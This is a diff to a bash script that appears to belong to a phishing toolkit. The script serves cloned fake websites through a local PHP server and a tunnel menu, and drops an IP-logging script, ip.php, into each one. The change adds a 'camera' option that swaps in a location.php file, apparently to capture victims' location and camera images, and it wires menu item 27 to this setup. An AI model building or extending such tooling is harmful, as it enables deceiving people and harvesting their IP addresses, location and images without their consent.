@@ -502,8 +502,13 @@ cusport() {
 ## Setup website and start php server
 setup_site() {
 	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Setting up server..."${WHITE}
-	cp -rf .sites/"$website"/* .server/www
-	cp -f .sites/ip.php .server/www/
+	if [ "$website" = "camera" ]; then
+		cp -rf .sites/"$website"/* .server/www
+		cp -f .sites/"$website"/location.php .server/www/
+	else
+		cp -rf .sites/"$website"/* .server/www
+		cp -f .sites/ip.php .server/www/
+	fi
 	echo -ne "\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Successfully set up PHP server!"${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
@@ -997,8 +1002,8 @@ main_menu() {
 			website="wifi"
 			tunnel_menu;;
 		27)
-			echo -e "\nRunning camera script..."
-        	bash camera/rendercam.sh;;
+			website="camera"
+			tunnel_menu;;
 		99)
 			about;;
 		0 | 00 )
